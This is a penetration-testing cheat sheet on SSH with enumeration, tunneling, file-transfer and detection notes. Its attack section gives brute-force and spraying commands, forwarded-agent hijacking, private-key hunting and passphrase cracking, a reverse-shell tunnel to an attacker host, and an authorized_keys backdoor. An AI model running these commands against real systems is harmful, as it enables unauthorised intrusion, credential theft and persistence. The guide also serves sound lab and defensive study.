# SSH

#SSH #SecureShell #remoteaccess

## What is SSH?
Secure Shell — encrypted protocol for remote command execution, file transfer (SCP/SFTP), and tunneling. Replaced insecure rlogin, rsh, and telnet. Standard implementation: OpenSSH.

- Port **TCP 22** — SSH (default)
- SSH-1 (deprecated, MITM vulnerable) vs SSH-2 (secure, current standard)
- Requires SSH server running on target (OpenSSH sshd)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `ssh-auth-methods`, `ssh-hostkey`, `ssh2-enum-algos`, `ssh-brute` NSE |
| [[Tools/Network/ssh-audit\|ssh-audit]] | Unauth algorithm/vuln audit (weak ciphers, Terrapin) |
| [[Tools/Auth/Hydra\|Hydra]] | Password brute (`ssh://`) |
| [[Tools/Auth/Medusa\|Medusa]] | Password brute (`-M ssh`) |
| [[Tools/Lateral Movement/NetExec\|NetExec]] | `nxc ssh` spray + `--key-file`/`--sudo-check` |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ssh_login`/`ssh_enumusers` modules |
| [[Tools/Auth/john the ripper\|John]] | `ssh2john` → crack private-key passphrase |
| [[Tools/Auth/hashcat\|hashcat]] | Crack key passphrase (`-m 229x1`, cipher-dependent) |
| [[Tools/Remote Access/Proxychains\|Proxychains]] | Route tools through an SSH SOCKS pivot |
| [[Tools/Remote Access/Netcat\|Netcat]] | Banner grab on 22 |

---

## Authentication Methods

| Method | Description |
|---|---|
| Password | Server sends cert; client sends hashed password |
| Public-key | Client presents private key; server matches to stored public key |
| Host-based | Based on trusted host identity (like r-services but encrypted) |
| Keyboard-interactive | Challenge-response (e.g., PAM, OTP) |
| GSSAPI | Kerberos-based authentication |

---

## Configuration Files

| File | Path | Description |
|---|---|---|
| Server config | `/etc/ssh/sshd_config` | SSH daemon configuration |
| Client config | `/etc/ssh/ssh_config` or `~/.ssh/config` | Client defaults |
| Authorized keys | `~/.ssh/authorized_keys` | Public keys allowed for login |
| Known hosts | `~/.ssh/known_hosts` | Trusted server fingerprints |
| Private key | `~/.ssh/id_rsa` (or `id_ed25519`) | Client private key |
| Public key | `~/.ssh/id_rsa.pub` | Client public key |

## Dangerous Settings

| Setting | Risk |
|---|---|
| `PasswordAuthentication yes` | Brute force / credential attacks |
| `ForwardAgent yes` (client) | Agent-forwarding hijack from a compromised hop (see Attack Vectors) |
| `PermitEmptyPasswords yes` | No password required |
| `PermitRootLogin yes` | Direct root access via SSH |
| `Protocol 1` | Vulnerable SSH-1 in use |
| `X11Forwarding yes` | X11 hijacking possible |
| `AllowTcpForwarding yes` | Tunneling possible |
| `PermitTunnel yes` | VPN-style tunneling possible |
| `AuthorizedKeysFile ~/.ssh/authorized_keys` | Predictable key location |

> [!warning] **A failed `ssh root@host` password login is an *ambiguous* result, not a "wrong password."** Ubuntu's default is `PermitRootLogin prohibit-password` — sshd **rejects password auth for root before ever checking the password**, but still shows a normal prompt, so the client sees the exact same "Permission denied" as a bad credential. If you have a candidate root password (e.g. recovered from a config/session store), **test it against PAM directly** where you already have a shell: `su -` (or `sudo -k; sudo -l`). On HTB *Instant*, `ssh root@` failed while `su -` succeeded with the **same** password. Rule: verify credentials against the **least-gated path** available, and retry a "rejected" password in every new context.

---

## Enumeration

```bash
# Nmap
nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -sV <target>

# Banner grab / version
nc -nv <target> 22
ssh -V

# ssh-audit (comprehensive security audit — weak algos + named CVEs)
ssh-audit <target>
python3 ssh-audit.py <target>
# Flags Terrapin (CVE-2023-48795, prefix-truncation MITM) on OpenSSH < 9.6 /
# when a vulnerable ChaCha20-Poly1305 or CBC-EtM cipher is negotiated

# Identify supported auth methods
ssh -v user@<target> 2>&1 | grep "Authentications that can continue"
ssh -v user@<target> -o PreferredAuthentications=none 2>&1
```

---

## Connect / Access

```bash
# Password auth
ssh user@<target>
ssh -p 2222 user@<target>  # custom port

# Key-based auth
ssh -i ~/.ssh/id_rsa user@<target>
ssh -i /path/to/key user@<target>

# Force password auth (ignore keys)
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no user@<target>

# Test specific auth method
ssh -v user@<target> -o PreferredAuthentications=password

# Legacy algorithms (older targets)
ssh user@<target> -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa

# Jump host / ProxyJump
ssh -J jumphost user@target
ssh -J user@jumphost:22 user@target

# Suppress host key check (lab only)
ssh -o StrictHostKeyChecking=no user@<target>
```

---

## File Transfer

```bash
# SCP — copy files
scp file.txt user@<target>:/path/
scp user@<target>:/path/file.txt .
scp -r local_dir/ user@<target>:/remote/

# With custom port
scp -P 2222 file.txt user@<target>:/path/

# SFTP
sftp user@<target>
sftp> put file.txt
sftp> get remote_file.txt
sftp> ls
sftp> cd /path
```

---

## SSH Tunneling

```bash
# Local port forward (access remote service via local port)
# Access target:3306 (MySQL) via localhost:3306
ssh -L 3306:127.0.0.1:3306 user@<target>
ssh -L <local_port>:<remote_host>:<remote_port> user@<jump_host>

# Remote port forward (expose local service on remote host)
# Expose attacker:80 on target:8080
ssh -R 8080:127.0.0.1:80 user@<target>

# Dynamic SOCKS proxy
ssh -D 1080 user@<target>
# Then: proxychains nmap ... (set proxy in /etc/proxychains.conf)

# Background tunnel
ssh -fN -L 3306:127.0.0.1:3306 user@<target>

# Reverse shell via tunneled connection
ssh -R 4444:127.0.0.1:4444 user@<attacker>
```

### proxychains + Dynamic SOCKS Proxy

```bash
# 1. Start dynamic SOCKS proxy via SSH
ssh -D 9050 -fN user@<pivot_host>
# or background it
ssh -D 9050 -fN -o StrictHostKeyChecking=no user@<pivot_host>

# 2. Configure proxychains (/etc/proxychains.conf or ~/.proxychains/proxychains.conf)
# socks5 127.0.0.1 9050   (or socks4)

# 3. Route tools through the proxy
proxychains nmap -sT -Pn -p 22,80,443 <internal_target>
proxychains nxc smb <internal_target>          # NetExec (crackmapexec is abandoned)
proxychains evil-winrm -i <internal_target> -u user -p pass
proxychains curl http://<internal_target>/
proxychains firefox &  # browse internal sites

# Verify proxychains works
proxychains curl -s http://ifconfig.me  # should show pivot host's IP
```

---

## Attack Vectors

### Brute Force

```bash
# Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4

# Medusa
medusa -h <target> -U users.txt -P passwords.txt -M ssh

# Nmap
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt <target>

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# NetExec — spray creds or a key across a range; --sudo-check flags where you can escalate
nxc ssh <target-range> -u users.txt -p 'Autumn2026!' --continue-on-success
nxc ssh <target> -u <user> --key-file id_rsa --sudo-check
```

### SSH Agent Hijacking (ForwardAgent Abuse)

If a user SSHes into a box you control with **agent forwarding on** (`ForwardAgent yes` / `ssh -A`), their agent socket lives on your box while they're connected — and root (or you, if you own the socket) can use their loaded keys to authenticate onward as them, without ever seeing the key material.

```bash
# On the compromised hop — find live forwarded agent sockets
ls -l /tmp/ssh-*/agent.*                       # one per active forwarded session
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l   # list the victim's loaded keys
# Use them to jump onward as the victim (no passphrase, no key file)
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh <victim>@<next-internal-host>
```

### Key-Based Attack (Weak Key / Stolen Key)

```bash
# Check for exposed private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# If key found, try connecting
chmod 600 id_rsa
ssh -i id_rsa user@<target>

# Check if key has passphrase
ssh-keygen -y -f id_rsa  # prompts for passphrase if encrypted

# Crack passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt  # new opencl mode
```

### Weak Key Generation (Debian CVE-2008-0166)

```bash
# Predictable keys generated on Debian-based systems between 2006-2008
# Download pregenerated key database
git clone https://github.com/g0tmi1k/debian-ssh
python2 debian_ssh_rsa_2048_x86.py <target> <user>
```

### Authorized Keys Placement (Post-Exploit Persistence)

```bash
# After gaining write access to home dir
mkdir -p /home/user/.ssh
echo "ssh-rsa AAAA... attacker" >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys

# SSH in with our private key
ssh -i ~/.ssh/id_rsa user@<target>
```

---

## SSH Key Generation

```bash
# Generate RSA key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa

# Generate Ed25519 key pair (modern, preferred)
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# Copy public key to target
ssh-copy-id -i ~/.ssh/id_rsa.pub user@<target>

# Manual copy
cat ~/.ssh/id_rsa.pub | ssh user@<target> "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

---

## Detection & Artefacts

- **auth.log / journald:** successful password login = `Accepted password for <user> from <ip>`; key login = `Accepted publickey ... key SHA256:<fp>` — the key fingerprint ties the session to a specific `authorized_keys` entry. Brute force = a flood of `Failed password` / `Invalid user` from one source; `PreferredAuthentications=none` probing shows as immediate disconnects.
- **Persistence IOC:** a new line in `~/.ssh/authorized_keys` (especially for root/service accounts) is the classic SSH backdoor — diff it against a known-good baseline; watch file-integrity events on `authorized_keys`.
- **Agent-hijack tell:** onward logins whose `authorized_keys` fingerprint belongs to a user who is *currently logged into a different host* (their agent was forwarded) — the source IP is the hop, not the key owner's workstation.
- **Tunneling/pivot:** long-lived sshd sessions with `-D`/`-L`/`-R` show up as sshd children bound to loopback/high ports; SOCKS pivots generate outbound connections from the pivot to many internal hosts over one SSH session.
- **Weak posture (report, not detect):** `ssh-audit`/`ssh2-enum-algos` output — SSH-1 enabled, CBC/RC4 ciphers, Terrapin-vulnerable cipher, `PermitRootLogin yes`, `PasswordAuthentication yes` on an internet-facing host.

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (password) | `ssh user@host` |
| Connect (key) | `ssh -i key.pem user@host` |
| Legacy algorithms | `ssh user@host -oHostKeyAlgorithms=+ssh-rsa` |
| Test auth methods | `ssh -v user@host -o PreferredAuthentications=none` |
| Brute force | `hydra -L users.txt -P rockyou.txt ssh://host` |
| Spray + sudo-check | `nxc ssh range -u users.txt -p 'Pass!' --sudo-check` |
| Crack key passphrase | `ssh2john key > hash; john hash --wordlist=rockyou.txt` |
| Agent hijack | `SSH_AUTH_SOCK=/tmp/ssh-*/agent.* ssh victim@next-host` |
| Local port forward | `ssh -L local_port:remote_host:remote_port user@host` |
| Dynamic SOCKS proxy | `ssh -D 1080 user@host` |
| SSH audit | `ssh-audit host` |
| SOCKS proxy setup | `ssh -D 9050 -fN user@pivot` then `proxychains <tool>` |
| Nmap scan | `nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos host` |

---

> [!note] **See also** — [[Services/File Xfer/SFTP|SFTP]] (SSH-based file transfer) and [[Services/File Xfer/Rsync|Rsync]] (bulk exfil/sync over SSH via `-e ssh`). Remote-access sibling [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]] (SSH is also the ASA/FTD management CLI — default creds, `show running-config`, FTD `expert`→`sudo su`).

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
